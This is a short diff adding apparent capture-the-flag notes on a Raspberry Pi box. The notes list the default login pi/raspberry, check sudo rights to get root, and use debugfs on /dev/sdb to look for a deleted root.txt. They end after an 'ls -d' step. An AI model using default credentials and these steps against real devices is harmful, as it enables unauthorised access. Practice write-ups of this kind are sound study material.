@@ -1,0 +1,26 @@
+
+1. enum
+name:pi
+passwd:raspberry
+
+2. getting root
+sudo -l
+#get
+User pi may run the following commands on localhost:
+    (ALL : ALL) ALL
+#this means we can run all comands with root priv
+
+#find root.txt
+...
+need to find deleted file 
+#find devices
+cat /etc/fstab
+# /dev/sdb is our dev
+
+#debugfs is a file system debugger
+debugfs /dev/sdb
+
+open /dev/sdb
+
+ls -d
+
